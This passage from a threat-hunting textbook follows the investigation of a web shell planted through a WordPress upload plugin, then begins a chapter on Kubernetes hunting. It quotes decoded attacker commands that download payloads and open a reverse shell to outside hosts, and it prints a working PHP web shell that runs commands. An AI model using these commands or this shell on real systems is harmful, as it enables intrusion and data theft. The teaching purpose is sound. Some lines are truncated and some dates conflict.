"2021/06/17 08:00:00","200","/wp-content/uploads/sp-client-documen  
"2021/06/17 08:00:49","200","/wp-content/uploads/sp-client-documen  
"2021/06/17 08:01:29","200/wp-content/uploads/sp-client-document-m yLjI5LjIyOCA4MCAtLXJlY29ubiAK"
The result of the search shows the following interesting activities:
There are seven events in a span of only three minutes.
 There are web requests are for project-plan.php. The file is located under /wp-content/uploads/sp-client-document-manager/3/. It is abnormal for uploaded project documents to have a php extension. In addition, the upload policy should have restricted uploading files with a php extension. This is a strong indicator of malicious activities.  There are web requests with long query strings, for example, id=Y3AgL2V0Yy9wYXNzd2QgL3RtcCBcCmxzIC1sYSAvdG1w. The queries contain the characters a-z, A-Z, %2B (the UTF-8 equivalent URL encoding for +) and %3D (the UTF-8 equivalent URL encoding for -) , which imply Base64 encoding. This is another strong indicator of potential malicious activities.
Note
URL encoding converts characters into a format that can be transmitted by a tool like a browser in a Universal Record Indicator (URI).
Let us have a look at the raw event for one of the web requests containing a long Base64 encoded query string.
Listing 4.7 Raw Event with Path Containing the Plugin Upload Directory
{
  "@timestamp": "2021-06-17T08:00:00.000Z",
  "date": "17/Jun/2022:08:00:00",
  "host": {
    "name": "portal"
  },
  "index": "default",
  "ip": "10.154.0.3",
  "length": "2094",
  "path": "/wp-content/uploads/sp-client-document-manager/3/projec
  "remote_log_name": "-",
  "request_method": "GET",
  "source": "/var/log/access.log",
  "sourcetype": "access_combined",
  "status": "200",                                                  "timezone": "+0000",
  "user_agent": "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/2010
  "userid": "-"
}
The next logical action is to try and decode the Base64 query strings. We can use a Base64 decode function, base64Decode, available in the event store search feature.
Listing 4.8 Decode Base64-Encoded Web Requests
sourcetype = access_combined AND
/project-plan.php/i
| replace("HTTP\/1\.1", with="", field=path, as=path_only)
| regex(".*[iIdD]=(?<encoded>.*)", field=path_only)              #
| replace("%3D", with="=", field=encoded, as=encoded)            #
| replace("%2B", with="+", field=encoded, as=encoded)            #
| decoded := base64Decode(encoded)                               # | table([date,decoded])
| sort(field=date, order=asc)                                    #
The following shows the search output. Let us note that the web server responded with status 200 to all requests to project-plan.php hosted in /wpcontent/uploads/sp-client-document-manager/3.
Although we could not locate project-plan.php in the directory, the decoded output reveals a lot about the attacker's activities. The output shows several commands sent by the attacker to what we believe is a web shell, project-plan.php. These are Unix-based commands, which indicate that the attacker is already aware of the underlying operating system of the web server. In addition, the output relates to one of the TTPs identified in the threat intelligence report: obfuscating Information using Base64 encoding,
MITRE ATT&CK T1027.
Listing 4.9 Base64-Decoded Web Requests
"time","decoded"
 
"2021/06/17 07:58:51","whoami"                                     
"2021/06/17 07:59:05","cd /tmp ; wget 34.125.53.119 -O project-pla  
"2021/06/17 07:59:30","which nc"                                   
"2021/06/17 08:00:00"," sleep 10 | nc -v 34.125.53.119 80 > /tmp/p  
"2021/06/17 08:00:49","ls -la /tmp"                                
"2021/06/17 08:00:49","/tmp/project-plan -e '/bin/bash' 34.152.29.
Let us summarize what we believe the attacker performed in the previous series of commands:
1. After successfully uploading the web shell file project-plan.php, potentially using the supplier007, the attacker started to interact with the web shell by executing the command whoami to understand the user associated with the web service.
2. The attacker then tried to download using wget or curl new code to the
/tmp directory. That failed which indicates that wget and curl are not available on the system. As a threat hunter, you are expected to confirm this assumption with the system administrator.
3. The attacker then tried to find out if other useful transfer tools are available, in this the attacker tried to find out if netcat, nc, is available and it seems that nc was indeed available on the system. We contacted the system administrator who confirmed that wget and curl are not available on the system, while netcat, nc, is. Keep a note of this, as it might result in recommendations you include in the threat hunting report later.
4. The attacker transferred some content to the server using nc and stored the content in a file named project-plan. As a threat hunter, you are expected to confirm this assumption with the system administrator.
5. The attacker then executed the project-plan passing it the following parameters:
a) /bin/bash
b) IP address 34.152.29.228 and port 80
c) --reconn which might be an instruction to project-plan to try to reconnect automatically if the connection is dropped for some reason.
6. No further events after the execution of what seems to be an outbound connection attempt, indicate that the interaction between the attacker and the web server has moved to a new channel established by the execution of /tmp/project-plan.
7. It is worth noting that the attacker named the files in a such way that they are relevant to the service delivered by the comprised web server.
At this stage, we can tell that project-plan.php is a web shell that was uploaded at one point time (unknown yet) to the web server by exploiting the WordPress plugin vulnerability and using the compromised account, supplier007. This is one of the TTPs identified in the threat intelligence report: uploading web shells to disk for initial access, MITRE ATT&CK T1505.003.
To capture the clues and findings, let us create the threat hunt timeline.
Figure 4.2 Findings timeline

Let us pause for a moment. In this scenario, you are expected to continuously update the threat intelligence team with your finding, take immediate actions and continue your hunt to uncover more evidence. For that, you would update the previously created security incident case with your findings. In addition, you would engage the incident response team, if they were not yet involved.
So far, important details that we could not establish yet include:
When was project-plan.php uploaded?
Which user uploaded the file project-plan.php?
Details that we need to confirm include:
The content of /tmp/project-plan
Whether the outbound connections to 34.125.53.119 and
34.152.29.228 using port 80 were successful and if so, the content downloaded or activities performed in these connections.
Now you have updated the incident case, let us continue with our hunt expedition and try to answer some of the above questions.
4.2.2 Digging More into the Web Requests
Let us try and establish when the web shell file project-plan.php was uploaded. The 3 in the URL path we have seen earlier, /wpcontent/uploads/sp-client-document-manager/3/, refers to the user account on WordPress. At this stage, you would contact the web server administrator to:
1. Confirm the identity of user number : The administrator replied to your request and identified supplier007 as user number 3. The administrator also mentioned that the account has been disabled, and all access privileges have been revoked.
2. Get the list of files in the /var/www/html//wp-content/uploads/spclient-document-manager/3/ directory and perform a system-wide search for the file project-plan.php. Considering the urgency and the visibility of this threat hunt expedition, the administrator took immediate actions and shared with you the following list of files in the directory.
Listing 4.10 Content of the Plugin Upload Directory
ls /var/www/html//wp-content/uploads/sp-client-document-manager/3/
 > 
important-document-2.docx project-1-cost-v0.1.xls project-2-cost-v0.11.xls project-2-update.pdf project-team-photo.jpeg
 
find / -name "project-plan.php" -print
> 
(None)
The directory does not contain files with a .php extension, although we have established earlier that there were requests to project-plan.php were successfully served by the web server. The web server responded to requests to project-plan.php with the status 200. In addition, a system-wide search for the file did not result in any findings. Not being able to locate the file indicates that the attacker has purposely deleted the file at one point in time to cover traces. This is one of the TTPs identified in the threat intelligence report: deleting files to remove indicators from the host T1070.004.
Let us now move on and try and find the content written to /tmp. We sent a request to the system administrators asking for the content of the /tmp directory. Unfortunately, the system administrator informed us that /tmp is empty. Again, not being able to locate files in temp indicates that the attacker has purposely deleted the file at one point in time to cover traces.
Considering the extent that the attacker went to cover traces, we requested the system administrator for the content of /var/log/apache2 directory. This is the location where the Apache2 web server logs are stored. The following shows the files in the directory as shared by the administrator.
Listing 4.11 Content of the Apache2 Default Log Directory
-rw-r--r-- 1 root root   1032809 Jun  17 20:38 access.log
-rw-r--r-- 1 root root    133666 Jun  17 21:49 error.log drwx------ 2 root root     16384 Dec 22 18:53 lost+found -rw-r--r-- 1 root root    358598 Jun  17 21:38 other_vhosts_access
The output shows that the log files access.log, error.log, and other_vhosts_access.log located in /var/log/apache2 were created on Jun 16, the same date as the suspicious web requests. The file creation indicates that the attacker has deleted the previous versions containing the previous events.
Luckily, events are collected in the central event store when they were first written to file.
Unfortunately, this also means that the attacker was able to gain root-level access to the system. The permission assigned to these files allows only the owner, root, to modify or delete them. This is extremely alarming.
Let us update the threat hunt findings timeline.
Figure 4.3 Findings timeline

Let us pause here for a moment. The extent of covering traces indicates a sophisticated and targeted attack. Our investigation revealed details you should share immediately with the other team members.
Disabling the account, supplier007 is insufficient; we now have strong evidence that the system has been compromised. What other actions should the team take? In addition, should the incident be escalated to higher management; for example, should we inform the Chief Information Officer, or even higher? The incident response process should clearly define the severity levels and the escalations and notifications associated with each level.
So far, we have used one event source type, the Apache web access logs. It is time to get further insights by accessing the firewall logs.
4.2.3 Tracking with Firewall Logs
We analyze inbound connections logged by the cloud provider firewall. These logs are available for search in the Humio event data store. Our analysis of the firewall logs will focus on the time from when we identified requests to project-plan.php.
Reviewing the complete list of connections is time-consuming. We should get a manageable number of network connections if we restrict our search to:
1. A few minutes (for example 10) before and after the time of the first suspicious web access event containing the Base64 encoded whoami command;
2. Web requests destined to TCP ports and 443 and
3. Look for traffic destined to one of the nodes hosting the web portal pods.
Listing 4.12 Search Cloud Firewall Logs
sourcetype=gcp:firewall                                           | src_ip := rename(jsonPayload.connection.src_ip)                 
| dest_ip := rename(jsonPayload.connection.dest_ip)
| dest_port := rename(jsonPayload.connection.dest_port)
| protocol := rename(jsonPayload.connection.protocol)
| disposition := rename(jsonPayload.disposition)
| protocol=6 AND (dest_port=80 OR dest_port=443) AND dest_ip=35.24
| time := formatTime("%Y/%m/%d %H:%M:%S", field=@timestamp, timezo
| table([time, src_ip, dest_ip, dest_port, protocol, disposition]) | sort(field=time, order=asc)
The output of the search shows a total of 35 connections using TCP/443.
Listing 4.13 Cloud Firewall Events Matching Search Criteria
"time","src_ip","dest_ip","dest_port","protocol","disposition"  
"2021/06/17 07:57:20","185.220.100.250","35.242.130.160","443","6"
"2021/06/17 07:57:21","185.220.100.250","35.242.130.160","443","6"
"2021/06/17 07:57:21","185.220.100.250","35.242.130.160","443","6"
"2021/06/17 07:57:21","185.220.100.250","35.242.130.160","443","6"
"2021/06/17 07:57:21","185.220.100.250","35.242.130.160","443","6"
"2021/06/17 07:57:26","185.220.100.250","35.242.130.160","443","6" "2021/06/17 07:58:02","185.220.100.250","35.242.130.160","443","6"
...
"2021/06/17 07:59:06","134.209.24.42","35.242.130.160","443","6"," "2021/06/17 07:59:11","185.220.100.250","35.242.130.160","443","6"
...
"2021/06/17 08:04:14","185.220.100.250","35.242.130.160","443","6"
Let us run the following search to summarize the source IP addresses and their locations.
Listing 4.14 Search and Summarize Source IP addresses
sourcetype=gcp:firewall
| src_ip := rename(jsonPayload.connection.src_ip)
| dest_ip := rename(jsonPayload.connection.dest_ip)
| dest_port := rename(jsonPayload.connection.dest_port)
| protocol := rename(jsonPayload.connection.protocol)
| disposition := rename(jsonPayload.disposition)
| protocol=6 AND (dest_port=80 OR dest_port=443) AND dest_ip=35.24 | ipLocation(field=src_ip)
| groupby(field=[src_ip.country, src_ip, dest_port], function=coun | sort(field=_count, order=desc)
The search generates the following output.
Listing 4.15 List of IP addresses with Count
"src_ip.country","src_ip","dest_port","_count"
"DE","185.220.100[.]250","443","33"
"GB","134.209.24[.]42","443","1"
"DE","139.162.145[.]250","443","1"
The search output shows incoming requests from the following source IP addresses:
 185.220.100[.]250 located in DE (country code for Germany), with 33 connections
 134.209.24[.]42 located in GB (country code for Great Britain), with 1 connection
 139.162.145[.]250 located in DE, with 1 connection
Let us collect further information about these IP addresses such as reputation, related IOCs, etc. For that, we perform a quick search for the IP addresses on VirusTotal and Talos. Figure 4.4 shows a snapshot from VirusTotal for each IP address.
Figure 4.4 IP addresses reputation snapshots - VirusTotal

All three IP addresses have been flagged as malicious by VirusTotal. 185.220.100[.]250, in particular, has been tagged as a TOR node. Talos maps the IP address to tor-exit-11.zbau.f3netze.de, as shown in Figure
4.5. A Talos also confirms the bad reputation of the other two IP addresses, 134.209.24[.]42 and 139.162.145[.]250.
Figure 4.5 IP addresses reputation snapshots - Talos

Knowing that the public IP address involved in the suspicious web activities is a TOR node does not provide us with much information about the attacker's identity. It merely correlates with the malicious web access activities we uncovered earlier. Still, we need to update the incident case to record all our findings.
Now that we looked at the inbound connections let us investigate outbound connections established from the web server to ports 80 and 443. For that, we change our search to the following. We start with a time window of 10 minutes before and after the first suspicious web access event containing the Base64 encoded whoami command.
Listing 4.16 Search Cloud Firewall Logs for Outbound Connections on TCP/80 or 443
sourcetype=gcp:firewall
| src_ip := rename(jsonPayload.connection.src_ip)
| dest_ip := rename(jsonPayload.connection.dest_ip)
| dest_port := rename(jsonPayload.connection.dest_port)
| disposition := rename(jsonPayload.disposition)
| src_ip=10.154.0.* AND (dest_port=80 OR dest_port=443) | groupby(field=[src_ip, dest_ip, dest_port], function=count()) | sort(field=_count, order=desc)
The output shows a total of 109 connections that match the search criteria.
The following is a summary. The events source IP addresses, 10.154.0[.]2,
10.154.0[.]3 or 10.154.0[.]4, are the three Kubernetes nodes that host the web server pods.
Listing 4.17 Cloud Firewall Events for Outbound Connections on TCP/80 or 443
"src_ip","dest_ip","dest_port","_count"
"10.154.0[.]2","10.76.2[.]16","443","28"
"10.154.0[.]3","10.76.2[.]16","443","22"
"10.154.0[.]4","142.250.200[.]10","443","5"
"10.154.0[.]3","142.250.179[.]234","443","4"
"10.154.0[.]2","216.58.212[.]234","443","2"
"10.154.0[.]3","172.217.16[.]234","443","2"
"10.154.0[.]3","142.250.180[.]10","443","2"
"10.154.0[.]2","142.250.187[.]202","443","2"
...
"10.154.0[.]4","34.125.53[.]119","80","1" "... "10.154.0[.]4","142.250.187[.]234","443","1"
"10.154.0[.]2","142.250.187[.]234","443","1"
From the output, we see the following outbound connections which correlate to the Base64 decoded commands sent to the Web shell:
 "10.154.0[.]4","34.125.53[.]119","80","1": One connection that correlate with the command sleep 10 | nc -v 34.125.53.119 80 >
/tmp/project-plan && chmod 755 /tmp/project-plan
 "10.154.0.4","34.152.29.228","80","3": Three connections which correlates with the command /tmp/project-plan -e '/bin/bash' 34.152.29.228 80 --reconn. We see three connections, despite seeing one web access event. This could be due to the --reconn parameter, which might have instructed the program project-plan to reconnect whenever its connection to 34.152.29.228 is lost. It could also be other activities performed by the attacker on the compromised system.
Figure 4.6 Findings timeline

Let us expand the search window to understand if more outbound connections have been established to 34.125.53[.]119 or 34.152.29[.]228, regardless of ports or protocols.
Listing 4.18 Search Cloud Firewall Logs for Outbound Connections - Expanded
sourcetype=gcp:firewall
| src_ip := rename(jsonPayload.connection.src_ip)
| dest_ip := rename(jsonPayload.connection.dest_ip)
| dest_port := rename(jsonPayload.connection.dest_port)
| disposition := rename(jsonPayload.disposition)
| src_ip=10.154.0.* AND (dest_port=80 OR dest_port=443) AND (dest_
| time := formatTime("%Y/%m/%d %H:%M:%S", field=@timestamp, timezo | table([time, src_ip, dest_ip, dest_port, disposition])
| sort(field=time, order=asc)
The output shows that two more connections were established later to
34.125.53[.]119 using TCP/80.
Listing 4.19 Cloud Firewall Events for Outbound Connections - Expanded
"time","src_ip","dest_ip","dest_port","disposition"
"2021/06/17 08:00:09","10.154.0.4","34.125.53.119","80","ALLOWED"
"2021/06/17 08:01:12","10.154.0.4","34.152.29.228","80","ALLOWED"
"2021/06/17 08:07:03","10.154.0.4","34.152.29.228","80","ALLOWED"
"2021/06/17 08:07:03","10.154.0.4","34.152.29.228","80","ALLOWED"
"2021/06/17 08:45:40","10.154.0.4","34.125.53.119","80","ALLOWED"
"2021/06/17 08:47:11","10.154.0.4","34.125.53.119","80","ALLOWED"
Figure 4.7 Findings timeline

We have no visibility at this stage about what precisely these two extra connections were for; there are no corresponding web access logs. The two events indicate that a program on the system has established them, for example, /tmp/project-plan, or another program the adversary could have uploaded to the compromised system.
A quick search on VirusTotal and Talos does not reveal much. Both reputation sources show that the two IP addresses are not malicious. This does not mean that they are not malicious in the context of this particular attack. It only means that they have not been identified by security vendors or researchers as malicious. This may indicate that this is a targeted attack, in which the adversary tried to minimize the chances of discovery to the lowest possible.
The threat intelligence report contained several IP addresses as indicators of compromise. Let us perform a search to find out if any of our systems have communicated with these IP addresses. We perform a search from the time the vulnerable version of the plugin was installed.
Listing 4.20 Search Cloud Firewall Logs for IOCs in the Threat Intelligence Report
sourcetype=gcp:firewall
| src_ip := rename(jsonPayload.connection.src_ip)
| dest_ip := rename(jsonPayload.connection.dest_ip) | dest_ip=188.169.199.59                                          
    OR dest_ip=178.175.8.253
    OR dest_ip=216.158.226.206
    OR dest_ip=119.59.124.163
    OR dest_ip=59.95.67.172
    OR dest_ip=59.96.27.163
    OR dest_ip=59.99.198.133
The search did not return any results. There were no outbound connections established to any of the IP addresses contained in the threat intelligence report.
The user, www-data, which the web service runs with, has access to all web content. We know by now that the web shell and other files uploaded to the server can run with the privileges available for this user. What consequences could this have?
4.2.4 Consequences
Documents uploaded to the WordPress server contain confidential information about the company and its partners. The www-data user can access this and more, located in /var/www/html. In addition, it can access configuration files located in /etc/apache2 and other readable files on the system. The attacker had the opportunity to quickly collect as much information as possible, upload it, and walk away after deleting the traces. They could have also left some backdoors for future access.
The adversary can use this information in different ways to:
Perform other attacks against the company
Launch attacks against partners
Blackmail the company and its partners
Publish partial or complete dump of the data, impacting the business of the company and its partners
Let us pause here for a moment. Our investigation revealed details you should share immediately with the other team members. In addition to system compromise, we now have possible data exfiltration. Should the incident be escalated to the company's executive management; for example, should we inform the Chief Executive Officer? The incident response process should help the team answer this question. Again, the incident response process should clearly define the severity levels and the escalations and notifications associated with each.
Now that we have completed the hunt and are at a stage where we would pass the information to the incident response team let us zoom out and consider the threat hunting process we followed.
4.3 Threat hunting process
The process has three phases: preparation, execution, and communication. Let us trace the process highlighting the steps that we went through.
4.3.1 Preparation
The following are the steps that we took to prepare for the hunt, also shown
in Figure 4.8:
1. The trigger for the threat hunt was information shared by the threat intelligence team in a threat intelligence report.
2. Knowing the urgency of the case, the hunter decided to immediately create a new hunt play.
3. The hunter followed the standard hunt play template
4. For the hunt, web access and public cloud firewall events were the data sources available for the hunt.
5. Web access and public cloud firewall events were collected and stored on the events datastore.
6. The threat hunter was able to access the data store and search the events using the datastore web interface. The performance of the searches was adequate.
Figure 4.8 Threat Hunting Process - Preparation Phase


The hunter creates the threat hunt play document as part of the process, borrowing information from the threat intelligence report.
Threat hunt play
Title: Hunt for web shells
Reference Number: Hunt-Play-Webshell-01
Background: The threat intelligence and vulnerability management teams sent an urgent message requesting you run a threat hunt expedition. The message contained a threat intelligence report that describes the active exploitation of a recently discovered vulnerability that allows attackers to upload webs hells. The organization operates a web application that is affected by this vulnerability. In addition, the threat intelligence report provides details about one of the supplier's credentials published for sales on a dark web marketplace.
 Hypothesis: We hypothesize that an attacker has successfully uploaded a web shell to the web server hosted on the public cloud provider by exploiting a vulnerability, CVE-2021-24347, in the files upload plugin. Scope: The scope of the hunt covers the public web servers Threat Techniques:
Uploading web shells to disk for initial access, MITRE ATT&CK
T1505.003
 Obfuscating Information using Base64 encoding, MITRE
ATT&CK T1027
 Conducting further operations to dump user credentials, MITRE
ATT&CK T1003
Adding/deleting user accounts as needed, MITRE ATT&CK T1136
Deleting files to remove indicators from the host T1070.004
  Exfiltrate data over the network, MITRE ATT&CK T1011 References:
MITRE ATT&CK Server Software Component: Web Shell,
T1505.003 (https://attack.mitre.org/techniques/T1059/003)
 MITRE ATT&CK Obfuscated Files or Information, T1027
(https://attack.mitre.org/techniques/T1027)
 OS Credential Dumping, T1003
(https://attack.mitre.org/techniques/T1003)
 MITRE ATT&CK Adding/deleting user accounts as needed
(T1136, https://attack.mitre.org/techniques/T1136/)
 MITRE ATT&CK Indicator Removal on Host: File Deletion,
T1070.004, (https://attack.mitre.org/techniques/T1070/004/)
 MITRE ATT&CK Exfiltration Over Other Network Medium,
T1011, (https://attack.mitre.org/techniques/T1011)
Let us move to the next phase, execution, which we mostly covered in this chapter.
4.3.2 Execution
The following are the steps that we took to execute the hunt, also shown in Figure 4.9:
1. We started with an initial set of searches that translate the procedures identified in the planning phase.
2. Based on the evidence collected, we proved the hypothesis.
3. During the threat hunt expedition, we continuously updated the security incident case that was first created by the threat intelligence team.
4. We explored the extent of the threat and captured a number of critical security findings.
Figure 4.9 Threat Hunting Process - Execution Phase


Now that a ticket is opened with the incident response team, let us move to the last phase, communication.
4.3.3 Communication
The following are the steps that we took to communicate the hunt finings, as shown in Figure 4.10:
1. After proving the hypothesis and collecting the evidence about the threat execution, we handed over the case to the incident response team to take the investigation further.
2. The threat hunter shared the following recommendations to enhance the security detection and prevention capabilities:
a) Restrict outbound connections established from servers. Having thisconfiguration would have blocked the outbound connections triggered by the adversary executing commands from the web shell or later from other programs uploaded to the web server.
b) Enable logging for user activities on the WordPress server and collectthis data on the central event store. This would have helped us identify when was the web shell file uploaded and other activities performed by the compromised account, supplier007.
c) Capture Linux activities using tools such as Sysmon for Linux andforward the events to the central event store. This would have answered questions that we had about files created on the compromised web server and other content the adversary accessed, modified, or executed.
d) Deploy a tool such as OSQuery on servers and provide threat huntersaccess to the tool. Having this would have helped us quickly answer questions about files or processes.
e) Remove unnecessary tools and services such as netcat to minimize theattack surface.
f) Enable network flow logging. In the case of public cloud deployment,this is capability is delivered by enabling VPC flow logging. VPC flow logs contain the number of bytes exchanged in a session. This would have helped us identify potential data exfiltration.
g) Use multi-factor authentication (MFA) to protect the user sign-inprocess to the application. Multifactor authentication involves the use of two or more pieces of evidence to authenticate; for example, using a password and a time-based token. Using MFA would have greatly reduced the possibility of the adversary accessing the system using the compromised account, supplier007.
h) Block inbound connections from TOR exit nodes. Althoughdetermined attackers can easily bypass this control, blocking TOR exit node IP addresses can help thwart some attacks.
3. Based on the information collected during the threat hunt, the threat would share additional TTPs uncovered during the expedition with the threat intelligence team. These would include the following:
a) Base64 encoding is used as a basic obfuscation technique tocommunicate with the web shell
b) Adversary explores using wget, curl or nc to download content to the compromised server from 34.125.53.119 using TCP/80
c) Adversary downloads content to /tmp and then executes it. The execution results in connecting to 34.152.29.228 using TCP/80
d) Adversary deletes the uploaded web shell file and other contentdownloaded to /tmp
4. The threat hunter would provide a detailed report summarizing findings and recommendations about the threat hunt expedition.
Figure 4.10 Threat Hunting Process - Communication Phase

With all the knowledge we gained from the threat hunt expedition, let us have an exercise before concluding the chapter.
4.4 Exercise
You came to know that there was an hourly backup performed for the content of /var/www/html. Imagine that you struck some luck: one of the hourly backups was performed before the adversary deleted the web shell file, project-plan.php. You requested a copy of the backed-up files and one of them was for project-plan.php. The content of the file is shown hereafter.
1. How could access to the content of project-plan.php assist you in the hunt expedition?
2. What Linux command would you use to perform a search that looks for instances where legitimate php files on the server were modified to include some of the code contained in this web shell.
You can download the web shell file from Chapter 4's repository on Github (https://github.com/threat-hunt/chapter4).
<title>PHP Web Shell</title>
<html>
<body>
    <!-- Replaces command with Base64-encoded Data -->
    <script>
    window.onload = function() {
        document.getElementById('execute_form').onsubmit = functio             var command = document.getElementById('cmd');             command.value = window.btoa(command.value);
        };
    };
    </script>
    
    <!-- HTML Form for inputting desired command -->
    <form id="execute_form" autocomplete="off">
        <b>Command</b><input type="text" name="id" id="id" autofoc
        <input type="submit" value="Execute" />
    </form>
    
    <!-- PHP code that executes command and outputs cleanly -->
    <?php
        $decoded_command = base64_decode($_GET['id']);         echo "<b>Executed:</b>  $decoded_command";         echo str_repeat("<br>",2);         echo "<b>Output:</b>";         echo str_repeat("<br>",2);
        exec($decoded_command . " 2>&1", $output, $return_status);         if (isset($return_status)):             if ($return_status !== 0):
                echo "<font color='red'>Error in Code Execution -                foreach ($output as &$line) {                     echo "$line <br>";
                };             elseif ($return_status == 0 && empty($output)):
                echo "<font color='green'>Command ran successfully             else:
                foreach ($output as &$line) {                     echo "$line <br>";
                };             endif;         endif;
    ?>
</body>
</html>
This brings us to the end of this chapter. The work we did in this hunt shows the importance of collaboration between the threat hunting team and the threat intelligence team. Threat intelligence information shared with the threat hunters should be actionable, allowing threat hunters to formalize and execute threat hunts. In some cases, threat hunters might be given limited time to research the issue, and hence the threat intelligence report should provide sufficient insights into the situation at hand.
During a hunt expedition, the hunter would encounter challenges with events, systems, and applications. Although we had two event types for this hunt, they could not provide the level of visibility we required to reach conclusive answers for some of the questions we had during the hunt.
In addition, we found out that the web service has been deployed as a cloudnative application using Kubernetes hosted in a public cloud infrastructure. knowing the urgency of the case, you might not have enough time to research the security of Kubernetes or other container-based application deployments. We will do that together in our next hunt in Chapter 5 where we hunt for threats against container-based deployments
4.5 Summary
 Similar to real-life situations, threat hunting in many cases is a collaborative effort between different teams: threat hunting, threat intelligence, vulnerability management, system administration, and incident response.
 Threat intelligence reports should be structured and actionable. They should provide enough insights, allowing threat hunters to take action and conduct effective threat hunt expeditions.
 Threat hunters should work closely with other team members to request information to help uncover threats. Threat hunters should also ensure to continuously update other team members about findings that they uncover.
 Threat hunters should share TTPs they uncover during threat hunting with the threat intelligence team.
 To achieve better threat hunting outputs, it is important to have good data collection coverage.
 During a hunt expedition, threat hunters often identify shortages in events collection and systems configuration. Threat hunters should provide meaningful recommendations to enhance future hunts and detection activities.
 The entire team engaged, including threat hunters, should follow the incident response process. The incident response process should clearly describe incident notification and escalation.
5 Hunting in Clouds
This chapter covers
How containers are used to deliver cloud-native applications Existing security standards relating to the security of cloud-native applications deployed using Kubernetes
 The differences between hunting in containerized and virtual machinebased environments
 What information to collect from private and public clouds and how to collect them
 Conducting a threat hunting expedition in a public cloud Kubernetes infrastructure
 Working with cloud-native data sets to achieve better visibility for an effective threat hunting expedition
As cloud-native applications become increasingly commonplace, it is increasingly likely that you will find yourself having to threat hunt in the cloud. In this chapter, we practice threat hunting by conducting an expedition in a public cloud infrastructure hosting a cloud-native application.
We then describe Kubernetes, identify critical data sources in a Kubernetes infrastructure, and describe how to collect and use various cloud infrastructure events for threat hunting, highlighting the differences between virtual machines and containers.
Finally, we document the threat hunt play and walk through the steps of the threat hunt process.
Let us start with introducing cloud-native applications and Kubernetes before we conduct a threat hunt expedition for a compromised Kubernetes infrastructure.
5.1 Hunt for a compromised Kubernetes infrastructure
In the previous chapter, we briefly introduced basic concepts related to containerized infrastructures. The compromised cloud-based application (WordPress running on Apache2) was running as a pod on a Kubernetes infrastructure hosted on a public cloud provider.
The security incident we uncovered in the previous chapter has triggered your interest in looking deeper into containers and container orchestration platforms such as Kubernetes.
In response, you decided to conduct a threat modeling exercise to identify relevant threat scenarios, and then design and conduct a threat hunt for one of the most relevant threat scenarios: an attacker escaping a Kubernetes container and gaining unauthorized access to a substantial portion of the Kubernetes environment.
Note
Cloud-native refers to the concept of designing, coding and running applications that can take advantage of the distributed computing services that a cloud delivery model offers.
Figure 5.1 shows core building blocks in Kubernetes: cluster, nodes, pods and containers.
Figure 5.1 Kubernetes Cluster, Node and Pod

Note
A Kubernetes cluster comprises a number of control planes and one or more physical or virtual machines referred to as worker nodes. The worker nodes host pods, which contain one or more containers. The container is an executable image that includes a software package and all its dependencies.
Containers and Kubernetes are core infrastructure building blocks to deliver the microservice architecture used to deliver modern applications. The microservice architecture aims to deliver rapid, frequent, and reliable delivery of large private and public applications using small services, each running in its own process (i.e., container) and communicating with each other using lightweight mechanisms such as Application Programming Interfaces (APIs.) Threat hunters should be familiar with the shift from monolithic-based applications, shown in Figure 5.2, to a microservice-based architecture, shown in Figure 5.3. Threat hunters should familiarize themselves with the cloud infrastructure that delivers this shift, including how APIs are used to access and manage the applications and infrastructure.
Figure 5.2 Deploying Monolithic Applications on Bare Physical Servers or Virtual Machines

Figure 5.3 Cloud-Native Microservice Applications Architecture

Equipped with the knowledge of cloud-native applications and Kubernetes, let us conduct a threat hunting expedition searching for a comprised Kubernetes infrastructure hosted in a public cloud provider.
Note
Concepts discussed in the chapter also apply to other managed public cloud infrastructures such as AWS Elastic Kubernetes Service (EKS), Azure
Kubernetes Service (AKS), Alibaba Cloud Container Service for Kubernetes (ACK), and IBM Cloud Container Service for Kubernetes (ACK). The concepts also apply to privately hosted Kubernetes infrastructures using vanilla Kubernetes or other orchestration platforms such as OpenStack and Rancher.
5.1.1 Threat Scenario
Based on the threat hunt expedition you conducted in chapter 4, you decided to conduct a threat modeling exercise, revealing potential threats associated with the Kubernetes cluster deployed on a public cloud provider.
A threat modeling exercise can reveal threats relevant to the environment, highlighting the impact levels of these threats. The list of threats identified through a threat modeling exercise is a good source for creating relevant threat hunt plays.
With multiple threats identified by a threat modeling exercise, which threats would you first hunt for? Generally, threat hunters need to prioritize ones with higher relevance and impact.
The following is a summary of the threat modeling scenario that we will use to design the hunt play and then conduct a threat hunt expedition:
Source: Internet
 Threat: An attacker escaping a Kubernetes container and gaining unauthorized access to a substantial portion of the Kubernetes environment, including the hosting node(s) and other pods/containers deployed in the Kubernetes cluster. When compromised, the attacker can successfully interact with the Kubernetes API server to harvest the cluster information and provision new resources to operate malicious services such as crypto mining, botnet nodes, or tor exit nodes.  Actor: Individual (malicious), state-sponsored groups or organized crime actors.
 Target: Containers and Kubernetes nodes hosted on a public or private cloud infrastructure.
 Attack vector: Attackers gaining access to a privileged container deployed on Kubernetes or having the right level of permissions to create a new privileged container can access the host's resources. A privileged container is a container that has been deployed with access to the devices of the host machine, lifting the limitations applied to ordinary containers.
 Impact of threat execution: The adversary can potentially gain complete control of the Kubernetes environment, covering all nodes and pods. In addition, the adversary might be able to host stealth containers that bypass existing Kubernetes security controls.
 Indicators of compromise:
1. Successful calls to the Kubernetes API server from unexpectedlocations
2. Successful calls to the Kubernetes API server using unexpectedaccounts
3. Successful calls to the Kubernetes API server using unexpected
agents
4. Unknown Kubernetes pods running in the cluster
Note
Escaping a Kubernetes container refers to the activity when a container is used as a launchpad to move to other parts of the Kubernetes environment, breaking a fundamental isolation security control that a containerized environment should.
Note
The Kubernetes API server is a critical control plan component hosted on a Kubernetes cluster master node and services REST API-based operations. The API server provides the frontend to the cluster's shared state through which all other components interact. Monitoring calls to the Kubernetes API server is vital for security monitoring and threat hunting.
With an understanding of the attack vector and the indicators of compromise, let us perform some research work to understand the current cloud application and infrastructure deployment.
5.1.2 Research work
The cloud native application is hosted on a public cloud service provider, Google Cloud Platform (GCP.) We were able to collect some initial information about the cloud infrastructure, application and events collected and stored.
Cloud
The following shows the details of the Google Kubernetes Engine cluster running in one Virtual Private Cloud (VPC).
Public cloud: Google Cloud Platform
Region: us-west1-a
Platform: Google Kubernetes Engine (GKE)
 Cluster type: GKE Standard (a pay-per-node Kubernetes cluster where you configure and manage the cluster nodes)
 Cluster size: Cluster autoscaling is enabled with three (3) minimum nodes and ten (10) maximum nodes. GKE's cluster The GKE cluster autoscaling configuration automatically resizes the number of nodes based on the demands of your workloads.
Kubernetes cluster name: production
Namespace where pods are deployed: chapter5
